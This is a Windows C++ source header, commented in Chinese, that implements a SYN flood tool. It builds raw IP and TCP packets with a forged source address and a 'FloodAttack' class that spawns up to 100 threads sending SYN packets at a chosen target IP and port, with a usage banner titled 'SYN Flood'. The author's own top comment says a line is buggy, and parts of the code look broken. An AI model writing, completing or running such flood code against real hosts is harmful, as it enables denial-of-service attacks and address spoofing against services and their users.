/*
	line : 112 存在错误，导致代码逻辑出现bug，亟待解决。
*/

#pragma once
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#pragma comment(lib,"ws2_32.lib")
#define SEQ 0x28376839
#define BUFFER_SIZE 128

class gss_raw_socket
{
private:

	typedef unsigned short ushort;
	typedef unsigned int uint;
	typedef unsigned char uchar;
	typedef unsigned long ulong;

	// 定义tcphdr结构存放TCP首部
	typedef struct tcphdr		// TCP首部
	{
		ushort th_srcPort;		// 16位源端口号
		ushort th_destPort;		// 16位目标端口号
		uint th_seq;			// 32位序列号
		uint th_ack;			// 32位确认号
		uchar th_lenres;		// 4位首部长度+6位保留字中的4位
		uchar th_flag;			// 6位标志位
		ushort th_win;			// 16位窗口大小
		ushort th_sum;			// 16位校验和
		ushort th_urp;			// 16位紧急数据偏移量
	}TCP_HEADER;

	// 定义iphdr结构存放IP首部
	typedef struct iphdr		// IP首部
	{
		uchar ih_verlen;		// 4位首部长度、4位IP版本号
		uchar ih_tos;			// 8位类型服务
		ushort ih_total_len;	// 16位总长度
		ushort ih_ident;		// 16位标志
		ushort ih_frag_flags;	// 3位标志位（如SYN、ACK等）、段偏移量
		uchar ih_ttl;			// 8位生存时间
		uchar ih_proto;			// 8位协议
		ushort ih_checksum;		// IP首部校验和
		uint ih_srcIP;			// 伪造IP地址
		uint ih_destIP;			// 攻击的IP地址
	}IP_HEADER;

	// TCP伪首部，用于进行TCP校验和的计算，保证TCP校验的有效性
	struct
	{
		ulong ph_srcAddr;		// 源地址
		ulong ph_destAddr;		// 目标地址
		char ph_mbz;			// 置空
		char ph_ptcl;			// 协议类型
		ushort ph_tcplen;		// TCP长度
	}PSD_HEADER;

	/*
	计算校验和
	先把IP首部的校验和字段设为0
	然后计算整个IP首部的二进制反码的和
	*/
	ushort checkSum(ushort *buffer, int size)
	{
		ulong ckSum = 0;
		while (size > 1)
		{
			ckSum += *buffer++;
			size -= sizeof(ushort);
		}
		if (size)
		{
			ckSum += *(uchar*)buffer;
		}
		ckSum = (ckSum >> 16) + (ckSum & 0xffff);
		ckSum += (ckSum >> 16);
		return (ushort)(~ckSum);
	}

	SOCKET sock = NULL;
	char sendBuf[BUFFER_SIZE];
	char recvBuf[BUFFER_SIZE];
	struct  sockaddr_in sockAddr;
	TCP_HEADER tcpHeader;
	IP_HEADER ipHeader;
	int seq;
	int errorCode;

	TCP_HEADER* precv_tcpHeader;
	IP_HEADER* precv_ipHeader;

	int init_tcp_ip_header(char* destIP, int destPort, char* srcIP, int srcPort)
	{
		// 设置目标地址
		memset(&sockAddr, 0, sizeof(sockAddr));
		sockAddr.sin_family = AF_INET;
		//printf("destIP : %s\n", destIP);
		sockAddr.sin_addr.S_un.S_addr = inet_addr(destIP);
		sockAddr.sin_port = htons(destPort);
		// 设置IP首部
		ipHeader.ih_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(ulong));
		ipHeader.ih_tos = 0;
		ipHeader.ih_total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
		ipHeader.ih_ident = 1;
		ipHeader.ih_frag_flags = (1<<6 | 0);
		ipHeader.ih_ttl = 57;

		// 设置此tcp协议 ，wireshark 无法侦听到此数据包 ？ 无法验证数据包的正确性
		ipHeader.ih_proto = IPPROTO_TCP;
		ipHeader.ih_checksum = 0;
		ipHeader.ih_srcIP = inet_addr(srcIP);
		ipHeader.ih_destIP = inet_addr(destIP);
		// 填充TCP首部
		tcpHeader.th_srcPort = htons(srcPort);
		tcpHeader.th_destPort = htons(destPort);
		tcpHeader.th_seq = htonl(0);
		tcpHeader.th_ack = 0;
		tcpHeader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
		
		tcpHeader.th_win = htons(16384);
		tcpHeader.th_sum = 0;
		tcpHeader.th_urp = 0;

		PSD_HEADER.ph_srcAddr = ipHeader.ih_srcIP;
		PSD_HEADER.ph_destAddr = ipHeader.ih_destIP;
		PSD_HEADER.ph_mbz = 0;
		PSD_HEADER.ph_ptcl = IPPROTO_TCP;
		PSD_HEADER.ph_tcplen = htons(sizeof(tcpHeader));

		//printf("ipHeader size : %d\n PSD_HEADER size : %d\n tcpHeader size : %d\n", sizeof(ipHeader), sizeof(PSD_HEADER),sizeof(TCP_HEADER));
		return 0;
	}

	template<typename T>
	bool check_error(T errorCode, T valid, char* name)
	{
		if (errorCode == valid)
		{
			printf("\n%s error : %d\n", name, GetLastError());
			return false;
		}
		return true;
	}

	int init_socket()
	{
		int flag = true, timeOut = 2000;
		sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);

		if (!check_error<SOCKET>(sock,INVALID_SOCKET,"WSASocket"))
		{
			return -1;
		}

		// 设置IP_HEADER 以便自己填充IP首部
		errorCode = setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(int));
		if (!check_error(errorCode, SOCKET_ERROR,"setsockopt 设置自行填充IP首部"))
		{
			return -1;
		}
		// 设置发送超时
		errorCode = setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeOut, sizeof(timeOut));
		if (!check_error(errorCode, SOCKET_ERROR, "setsockopt 设置发送超时"))
		{
			return -1;
		}
		// 设置接受超时
		errorCode = setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeOut, sizeof(timeOut));
		if (!check_error(errorCode, SOCKET_ERROR, "setsockopt 设置接受超时"))
		{
			return -1;
		}

		return 0;
	}

	int init_sendBuf(uchar flag)
	{
		seq = seq == INT_MAX ? 1 : seq;
		ipHeader.ih_checksum = 0;
		tcpHeader.th_seq = htonl(seq);
		tcpHeader.th_flag = flag; // URG（紧急指针有效）、ACK（确认序号有效）、PSH（接收方应尽快将此报文段交给应用层）、RST（重建连接）、SYN（发起一个连接）、FIN（释放一个连接）
		tcpHeader.th_sum = 0;

		// 把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP校验和
		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
		memcpy(sendBuf + sizeof(PSD_HEADER), &tcpHeader, sizeof(tcpHeader));
		tcpHeader.th_sum = checkSum((ushort*)sendBuf, sizeof(PSD_HEADER) + sizeof(tcpHeader));

		//ipHeader.ih_checksum = 0;
		memcpy(sendBuf, &ipHeader, sizeof(ipHeader));
		memcpy(sendBuf + sizeof(ipHeader), &tcpHeader, sizeof(tcpHeader));
		memset(sendBuf + sizeof(ipHeader) + sizeof(tcpHeader), 1, 4);
		int dataSize = sizeof(ipHeader) + sizeof(tcpHeader);
		ipHeader.ih_checksum = checkSum((ushort*)sendBuf, dataSize);

		//memcpy(sendBuf, &ipHeader, sizeof(ipHeader));

		++seq;

		return 0;
	}

	int init(char* destIP, int destPort, char* srcIP, int srcPort)
	{
		WSADATA wsaData;

		if ((errorCode = WSAStartup(MAKEWORD(2, 2), &wsaData)) != 0)
		{
			printf("WSAStartup failed: %d\n", errorCode);
			return -1;
		}
		
		if (init_socket() == -1)
		{
			printf("init_socket failed\n");
		}
		return init_tcp_ip_header(destIP, destPort, srcIP, srcPort);
	}

	int clear()
	{
		if (sock != INVALID_SOCKET && socket != NULL)
		{
			closesocket(sock);
		}
		return WSACleanup();
	}

	int init_recvBuf()
	{
		precv_ipHeader = (IP_HEADER*)recvBuf;
		precv_tcpHeader = (TCP_HEADER*)(recvBuf + sizeof(IP_HEADER));

		return 0;
	}

public:
	typedef struct rawparam
	{
		char* rp_destIP;
		int rp_destPort;
		char* rp_srcIP;
		int rp_srcPort;
		int rp_startSeq;
	}RAW_PARAM;

	gss_raw_socket(char* destIP, int destPort, char* srcIP, int srcPort, int startSeq = 0)
		:seq(startSeq)
	{
		if (init(destIP, destPort, srcIP, srcPort) == -1)
		{
			printf("gss_raw_socket constructor failed!\n");
		}
	}

	~gss_raw_socket()
	{
		clear();
	}
	

	int gss_send(uchar tcp_flag)
	{
		int ret = init_sendBuf(tcp_flag);
		if (!check_error(ret,-1,"init_sendBuf"))
		{
			return -1;
		}
		ret = sendto(sock, sendBuf, 40, 0, (struct sockaddr*)&sockAddr, sizeof(sockAddr));
		if (!(check_error(ret,-1,"sendto")))
		{
			return -1;
		}
		else
		{
			printf("\n srcPort : %d \t destPort : %d sendto sucess \n", tcpHeader.th_srcPort , sockAddr.sin_port);
			return 0;
		}
	}

	int gss_recv()
	{
		memset(recvBuf, 0, BUFFER_SIZE);
		int recvLen = recv(sock, recvBuf, BUFFER_SIZE, 0);
		if (!check_error(recvLen, SOCKET_ERROR,"recv"))
		{
			// 接收出错
			return -1;
		}
		else if (recvLen == 0)
		{
			// 连接关闭
			printf("recv close \n");
			return -1;
		}
		else if (recvLen >= 46)
		{
			init_recvBuf();
			return 0;
		}
		return -1;
	}

	bool isDestIP()
	{
		return precv_ipHeader->ih_srcIP == sockAddr.sin_addr.S_un.S_addr;
	}

	// URG（紧急指针有效）、ACK（确认序号有效）、PSH（接收方应尽快将此报文段交给应用层）、RST（重建连接）、SYN（发起一个连接）、FIN（释放一个连接）
	// index： 1-6；
	bool isSet_TCPFlag(int index)
	{
		return precv_tcpHeader->th_flag &(1 << (6 - index));
	}

	bool isURG()
	{
		return isSet_TCPFlag(1);
	}

	bool isACK()
	{
		return isSet_TCPFlag(2);
	}

	bool isPSH()
	{
		return isSet_TCPFlag(3);
	}

	bool isRST()
	{
		return isSet_TCPFlag(4);
	}

	bool isSYN()
	{
		return isSet_TCPFlag(5);
	}

	bool isFIN()
	{
		return isSet_TCPFlag(6);
	}
};

class FloodAttack
{
private:

	typedef unsigned short ushort;
	typedef unsigned int uint;
	typedef unsigned char uchar;
	typedef unsigned long ulong;

	// 定义线程参数
	typedef struct floodattackthreadparam
	{
		FloodAttack* fatp_this;
		int fatp_threadIndex;
		gss_raw_socket::RAW_PARAM raw_param;
	}FLOODATTACK_THREAD_PARAM;

	static DWORD WINAPI runner(LPVOID lpParam)
	{
		FLOODATTACK_THREAD_PARAM* fatp = (FLOODATTACK_THREAD_PARAM*)lpParam;
		gss_raw_socket raw(fatp->raw_param.rp_destIP, fatp->raw_param.rp_destPort,
			fatp->raw_param.rp_srcIP, fatp->raw_param.rp_srcPort, fatp->raw_param.rp_startSeq);
		
		int errorCode = 0;
		do{
			errorCode = raw.gss_send(2);
			if (errorCode == -1)
			{
				printf("gss_send failed : %d\n", GetLastError());
				return -1;
			}
			display(fatp->fatp_threadIndex);
		} while (false);
		Sleep(20);
		//InterlockedExchangeAdd((long*)mThreadNum, -1);
		//std::cerr << "InterlockedExchangeAdd " << fatp->fatp_threadIndex << "\n";
		return 0;
	}

	int mThreadNum;
	int mMaxThread;
	int mPort;
	char* mDestIP; // 目标IP
	char* mSrcIP;

public:
	// 定义状态提示函数
	static void display(int threadIndex)
	{
		static int play = 0;
		// 进度条
		char *plays[12] =
		{
			" | ",
			" / ",
			" - ",
			" \\ ",
			" | ",
			" / ",
			" - ",
			" \\ ",
			" | ",
			" / ",
			" - ",
			" \\ "
		};
		printf("==%s= %d threads \r", plays[play], threadIndex);
		play = (play + 1) % 12;
	}

	void usage(char *name)
	{
		printf("\t=========================== SYN Flood =======================\n");
		printf("\tusage: %s [src_IP] [dest_IP] [port] [thread]\n", name);
		printf("\tExample: %s 192.168.199.139 192.168.1.1 80 100\n", name);
	}

	FloodAttack()
		:mMaxThread(0), mThreadNum(0) {}
	~FloodAttack(){}

	int run(int argc, char* argv[])
	{
		if (argc != 5)
		{
			usage(argv[0]);
			return 0;
		}
		usage(argv[1]);

		int errorCode = 0;
		printf("mSrcIP : %s", argv[1]);
		mSrcIP = argv[1];
		mDestIP = argv[2];
		printf("mdestIP : %s", mDestIP);
		mPort = atoi(argv[3]);
		mMaxThread = atoi(argv[4]);
		// 线程数最大为 100
		mMaxThread = (mMaxThread > 100) ? 100 : mMaxThread;

		
		printf("[start]......   \nPress any key to stop!\n");

		HANDLE* handles = new HANDLE[mMaxThread]();

		while (mThreadNum < mMaxThread) // 循环创建线程
		{
			FLOODATTACK_THREAD_PARAM threadParam;
			threadParam.fatp_threadIndex = mThreadNum;
			threadParam.raw_param.rp_destIP = mDestIP;
			threadParam.raw_param.rp_destPort = mPort;
			threadParam.raw_param.rp_srcIP = mSrcIP;
			threadParam.raw_param.rp_srcPort = (mPort + 1024 + mThreadNum +65535) % 65535 + 1;
			threadParam.raw_param.rp_startSeq = mThreadNum + SEQ;
			if ((handles[mThreadNum] = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runner, (LPVOID)&threadParam, 0, 0)))
			{
				Sleep(10);
				++mThreadNum;
			}
		}
		printf("\n create finished!\n\r");

		for (int i = 0; i < mMaxThread; ++i)
		{
			WaitForSingleObject(handles[i], INFINITE);
			//printf("\nafter WaitForSingleObject %d\n",i);
		}

		for (int i = 0; i < mMaxThread; ++i)
		{
			CloseHandle(handles[i]);
			//printf("\nafter CloseHandle %d\n", i);
		}
		delete[] handles;
		printf("\n[Stopd]......\n");
		return 0;
	}
};

